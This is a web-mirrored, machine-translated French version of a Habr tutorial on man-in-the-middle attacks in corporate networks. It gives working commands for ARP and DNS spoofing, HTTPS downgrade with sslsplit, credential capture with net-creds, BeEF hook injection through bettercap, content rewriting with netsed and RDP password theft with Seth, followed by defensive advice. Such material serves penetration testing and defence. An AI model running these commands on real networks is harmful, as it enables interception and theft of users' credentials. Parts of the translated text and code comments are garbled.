<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧑🏽‍🤝‍🧑🏽 🍪 👌🏾 Réseau d'entreprise et MitM. 2e partie 🈳 🧑‍🤝‍🧑 🏰</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Intercepter des informations sensibles? Obtenez un accès non autorisé à diverses applications et systèmes? Perturber le fonctionnement normal? Tout ce...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Réseau d'entreprise et MitM. 2e partie</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/acribia/blog/461305/"><img src="https://habrastorage.org/webt/od/nu/9e/odnu9ewf9ew8msybaqeimyynca8.png"><br><br>  Intercepter des informations sensibles?  Obtenez un accès non autorisé à diverses applications et systèmes?  Perturber le fonctionnement normal?  Tout cela et bien plus encore effectuent des attaques comme Man in the Middle. <br><br>  Aujourd'hui, nous continuons la série d'articles consacrés aux attaques de «l'homme au milieu» (et un certain nombre d'autres) sur des protocoles et des canaux de transmission typiques de presque toutes les entreprises.  Considérez les niveaux d'intérêt beaucoup plus importants pour l'attaquant: du réseau à l'application. <br><br>  Intéressé par?  Bienvenue au chat. <br><a name="habracut"></a><br><h3>  N'oubliez pas </h3><br>  Ainsi, dans l'article précédent, nous nous sommes concentrés sur les attaques d'usurpation dans les environnements filaires et sans fil, en montrant les techniques de surveillance des demandes et des réponses aux serveurs DNS.  Le DNS a été choisi pour une raison - c'est l'un des principaux objectifs.  Pourquoi?  Tout est simple - presque toutes les sessions commencent maintenant par une demande d'adresse IP de l'hôte cible sur les serveurs DNS. <br><br>  Aujourd'hui, nous allons montrer des attaques "sur cuivre", mais pour le même Wi-Fi, pratiquement rien ne change, sauf quelques nuances.  Nous omettons l'insertion dans l'optique, car ce vecteur d'attaques est très coûteux et nécessite un équipement spécial. <br><br>  Pour commencer, nous nous intéressons à l'interception «invisible» des requêtes DNS.  J'utiliserai quelques-uns des utilitaires suivants: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">DNS2Proxy</a> (l'utilitaire existe depuis de nombreuses années, mais il est toujours assez prêt au combat) et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">arpspoof</a> (également pas jeune). <br><br>  Nous lançons: <br><br><pre><code class="plaintext hljs"># arpspoof -r 192.168.180.254 192.168.180.1 //  IP –  ,  -  # python2 dns2proxy.py -u 192.168.180.253 //  -u   IP-,        # iptables -t nat -A PREROUTING -i enp14s0 –p udp --dport 53 -j DNAT --to-destination 192.168.180.253:53</code> </pre> <br>  Voyons maintenant comment cela affecte la machine de la victime en effectuant nslookup sur n'importe quel domaine: <br><br> <a href=""><img src="https://habrastorage.org/webt/xn/l6/ek/xnl6ekoftmi1evo5ebyifnh01w4.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/td/bb/wl/tdbbwlw8lohyslxzkbldz6cnngg.jpeg"></a> <br><br>  Eh bien, la victime reçoit l'adresse IP hôte requise par l'attaquant, probablement l'adresse IP locale du périphérique à partir duquel l'attaque se développe.  La capture d'écran montre également que le client croit qu'un serveur DNS légitime lui répond, ce qui, bien sûr, est un peu faux.  En fait, la fonctionnalité de l'utilitaire DNS2Proxy est assez large: vous pouvez spécifier des domaines spécifiques pour l'usurpation d'identité, ou vous pouvez, au contraire, tout usurper en ajoutant certains aux exceptions. <br><br>  Et ensuite?  Et puis nous devons déployer un serveur Web «proxy» qui établira 2 connexions: l'un est un «proxy» &lt;&gt; un nœud légitime sur le réseau, et le second est une victime «proxy» &lt;&gt;.  Nous utiliserons <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">SSLsplit</a> . <br><br>  Nous lançons: <br><br><pre> <code class="plaintext hljs"># sslsplit –l 2000 # iptables -t nat -A PREROUTING -i enp14s0 –p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.180.253:2000</code> </pre> <br>  Nous vérifions ce qui se passera si nous essayons de passer à un portail automobile, par exemple, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">drom.ru</a> : <br><br> <a href=""><img src="https://habrastorage.org/webt/fw/lx/9s/fwlx9svzpbcjr8zhj9bpphumnnw.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/rj/pr/ey/rjpreyx0-d8_un53lczbmvq6x9o.jpeg"></a> <br><br>  Et nous avons une connexion non protégée!  Mais avec la mise en garde: wwww et webmy.drom.ru ont été ajoutés en tant que sous-domaine au lieu de my.drom.ru.  Essayons de nous connecter, après avoir utilisé un utilitaire pour afficher le trafic de transit sur le périphérique de l'attaquant.  J'utiliserai des <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">net-creds</a> .  Nous regardons ce qu'il affiche dans la console: <br><br> <a href=""><img src="https://habrastorage.org/webt/gx/tf/vz/gxtfvz5d7ixeomuz95kn5nplkrm.png"></a> <br><br>  Et nous avons un nom d'utilisateur / mot de passe, super! <br><br>  La question se pose probablement: "Quelle est la différence avec l'article précédent?"  La différence est que sans ces manipulations, une connexion HTTPS est établie, ce qui rend presque impossible l'interception de comptes.  Il s'agit de la soi-disant «attaque de rétrogradation». <br><br>  Tout de même fonctionnera même avec les banques et autres ressources: <br><br> <a href=""><img src="https://habrastorage.org/webt/rs/lu/od/rsluoddsilfffe7nwpqfl1cydge.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/ku/mh/yk/kumhykptgifo_5x_vw73f8wwsto.jpeg"></a> <br><br>  Mais cela <b>ne</b> vaut <b>PAS la</b> peine de blâmer les banques de cette façon, l'utilisateur peut être «piraté».  Ils ne peuvent rien faire ici, car l'attaque dépasse de loin leur périmètre!  La banque n'est <b>PAS</b> à blâmer!  De plus, ils utilisent tous 2FA, ce qui réduit légèrement le risque d'accès. <br><br>  Remarque: de cette façon, même HSTS (HTTP Strict Transport Security) est contourné, mais pas pour toutes les ressources (ce que je pense, tout ou presque tout le monde ici connaît déjà).  Un certain nombre de navigateurs conservent une liste de domaines avec lesquels une connexion via TLS est requise, et une telle attaque contre eux est impuissante.  L'exemple le plus simple est <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">google.com</a> , et la liste complète de Chromium est <a href="https://cs.chromium.org/chromium/src/net/">ici</a> .  Firefox et Chrome / Chromium ne créeront pas de connexion HTTP avec lui, protégeant ainsi l'utilisateur.  Cependant, si un attaquant parvient à ajouter en quelque sorte «son» certificat auto-signé aux autorités de certification racine de confiance ou, pire encore, de confiance, rien ne sera utile, tout simplement parce que le navigateur et le système les considéreront initialement comme complètement légitimes et ne produiront aucune erreur. pendant leur traitement.  Le cas des autorités de certification racine de confiance est particulier: cela vous permettra de générer un certificat pour chaque domaine à la volée (c'est ainsi que fonctionnent généralement DLP et d'autres outils de protection qui analysent le trafic), ce qui vous permet d'analyser toute connexion HTTPS sans aucun problème ni notification du navigateur. <br><br>  Tous les outils répertoriés ci-dessus sont déjà obsolètes, car ils utilisent Python2, dont la prise en charge cessera bientôt.  Vous pouvez utiliser n'importe quel analogue, par exemple, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">bettercap</a> , qui est un «moissonneur» de divers outils et remplit toutes les mêmes fonctions énumérées ci-dessus, ainsi que plusieurs autres.  Seul commentaire sur son travail: les dernières versions ne veulent pas «résoudre» tous les domaines par défaut, il faut en spécifier des spécifiques.  Cependant, pour les "vraies" attaques, cela suffit pour les yeux et aide même à ne pas ouvrir à l'avance. <br><br>  Qu'est-ce que MitM permet d'autre?  Importez JS aka XSS.  Et puis un large champ de créativité.  Commençons par utiliser bettercap et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">boeuf</a> : <br><br>  In bettercap comprennent: <br><br><pre> <code class="plaintext hljs"># set arp.spoof.targets 192.168.180.254 # arp.spoof on # set http.proxy.sslstrip true # set http.proxy.injectjs http://192.168.180.253:3000/hook.js # http.proxy on</code> </pre> <br>  Si nous voulons être implémentés sur les pages HTTPS, nous configurons également dns.proxy.  Dans le cadre de la démo, je ne gérerai que HTTP. <br><br>  Allez sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">diary.ru</a> et observez ce qui suit dans le débogueur: <br><br> <a href=""><img src="https://habrastorage.org/webt/mm/rl/ar/mmrlarlqn2ig49fmvrrqltbvwk8.jpeg"></a> <br><br>  Voyons comment les choses se passent dans l'interface Web de boeuf: <br><br> <a href=""><img src="https://habrastorage.org/webt/5o/yt/1z/5oyt1zelqgu7mlv5ztj_csg3gn0.png"></a> <br><br>  En fait, nous avons terminé, nous sommes «dans le navigateur».  2 sessions ont été créées, probablement parce que j'ai ouvert une autre page en arrière-plan, mais ce n'est pas un problème.  Maintenant, vous pouvez commencer à <s>créer un gâchis</s> pour collecter des informations, développer une attaque, dans certains cas, ouvrir un shell ou tout simplement le mien.  Une partie des fonctionnalités possibles est présentée dans la capture d'écran du tableau «Arborescence des modules».  Pour le test, exécutez la réception de l'empreinte digitale du navigateur: <br><br> <a href=""><img src="https://habrastorage.org/webt/6h/mb/j_/6hmbj_zulrlxccb5gyq2yds-jsa.png"></a> <br><br>  Cependant, les développeurs de navigateurs ne sont pas stupides et essaient de couvrir divers "trous" qui permettent d'accéder d'un simple clic de doigt.  D'un autre côté, un tel accès peut grandement faciliter la poursuite de la consolidation sur l'hôte attaqué. <br><br>  Passons à la dernière attaque d'aujourd'hui - l'usurpation de données.  En général, cette attaque s'appuie sur un article distinct, elle peut être utilisée même lors du transfert d'images de machines virtuelles pour y accéder (peut-être que je vais un jour révéler ce sujet plus en détail), mais maintenant nous allons effectuer une courte démonstration, par exemple, sur le site Web <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">pasted.co</a> - la ressource la plus simple, permettant un certain temps pour donner accès à toute information textuelle.  Pour l'attaque, nous utilisons un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">filet</a> . <br><br>  Nous lançons: <br><br><pre> <code class="plaintext hljs"># netsed tcp 4000 0 0 s/Hello/HACKED/o # iptables -t nat -A PREROUTING -i enp14s0 –p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.180.253:4000 # arpspoof -r 192.168.180.254 192.168.180.1</code> </pre> <br>  Sur le nœud attaqué, allez sur pasted.co, écrivez notre 'Bonjour', envoyez-le, obtenez un lien, ouvrez-le et voyez notre 'HACKED'.  Un exemple est simple, mais, je pense, imaginer qu'en principe, il est possible de mettre en œuvre une telle attaque n'est pas difficile. <br><br> <a href=""><img src="https://habrastorage.org/webt/kn/6x/ey/kn6xeypuktcczpfa8lywvcsl3gm.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/f_/e6/fo/f_e6fogxo0n7am8oq1kpiblaqow.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/5v/eq/68/5veq68u2vkaj-4gzipx4r96jb9i.jpeg"></a> <br><br><h3>  Quelques mots sur RDP et MitM </h3><br>  Il y a un utilitaire aussi intéressant appelé <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Seth</a> et, en fait, c'est un tas de aprspoof et sslstrip, mais pour RDP.  L'essentiel est simple: lors de l'accès au port 3389, Seth agit de manière similaire à sslstrip et établit sa propre connexion au nœud cible.  L'utilisateur entre les informations d'identification ... et vous pouvez vous arrêter là. <br><br>  Nous lançons: <br><br><pre> <code class="plaintext hljs"># ./seth.sh enp14s0 192.168.180.253 192.168.180.254 192.168.180.1</code> </pre> <br>  Nous commençons sur le client RDP, nous nous connectons à n'importe quel hôte RDP (je me suis connecté au serveur en dehors du réseau 192.168.180.0/24) et entrons dans le compte.  Personnellement, après cette étape, j'ai détecté une erreur à chaque fois, bien que l'utilitaire devrait proxy la connexion, mais il a fait la partie la plus importante du travail: <br><br> <a href=""><img src="https://habrastorage.org/webt/29/ys/iw/29ysiw3wroqids1kqhhmlcjdwj8.png"></a> <br><br>  Le rectangle en surbrillance avait un mot de passe clair. <br><br><h3>  Se défendre </h3><br><ol><li>  Utilisez toutes les mesures indiquées dans notre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">article précédent</a> .  Ça aide vraiment!  J'ajouterai séparément l'inclusion de l'espionnage DHCP, ce qui nous permettra de filtrer les serveurs DHCP illégitimes, ce qui peut amener le client à envoyer toutes les demandes à l'hôte de l'attaquant, en évitant l'usurpation d'arp. </li><li>  Si possible, utilisez des extensions comme HTTPS partout.  Il sera automatiquement redirigé vers la version https du site s'il est inclus dans sa base de données, ce qui évite la rétrogradation HTTPS. </li><li>  Pour DNS, vous pouvez utiliser DNS sur TLS / DNS sur HTTPS ou DNSCrypt.  Les outils ne sont pas parfaits, le support peut être assez douloureux, mais dans certains cas, c'est une bonne mesure de protection. </li><li>  Apprenez et apprenez à votre famille, vos amis et vos collègues à faire attention à la barre d'adresse: c'est important!  wwww.drom.ru, les notifications concernant une connexion non protégée sur une ressource auparavant «sans tracas» sont souvent un signe certain d'une sorte d'anomalie dans le réseau. </li></ol><br>  Faites attention aux anomalies dans les sessions RDP: un certificat modifié de manière inattendue est un mauvais signe. <br><br>  C'est tout pour l'instant.  Ou pas?  Amis, j'aimerais savoir de vous, mais êtes-vous intéressé par l'attaque de l'hyperviseur et la migration des machines?  Ou une injection dans des fichiers PE?  En attente de vos commentaires et questions! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr461305/">https://habr.com/ru/post/fr461305/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr461289/index.html">Sortie de CLion 2019.2: support de développement intégré, débogueur pour MSVC, recherche de fichiers d'en-tête inutilisés</a></li>
<li><a href="../fr461291/index.html">Golang: problèmes de performances spécifiques</a></li>
<li><a href="../fr461297/index.html">À quoi ressemblent les attaques ciblées modernes</a></li>
<li><a href="../fr461299/index.html">Comment le PC a conquis l'industrie des médias avec des logiciels performants: discussion sur Pro Tools et Media Composer</a></li>
<li><a href="../fr461303/index.html">Utilisation de la carte Troïka comme police d'assurance médicale obligatoire</a></li>
<li><a href="../fr461307/index.html">Nous vous invitons au VK Hackathon 2019. La cagnotte de cette année est de deux millions de roubles.</a></li>
<li><a href="../fr461309/index.html">Tout sauf Kotlin: Andrei Breslav sur l'équilibre entre les sexes dans l'informatique, les émotions et plus encore</a></li>
<li><a href="../fr461313/index.html">Sortie de Zimbra 8.8.15 LTS</a></li>
<li><a href="../fr461317/index.html">9 principes pour créer des applications iOS de qualité</a></li>
<li><a href="../fr461319/index.html">Que fait un game designer?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>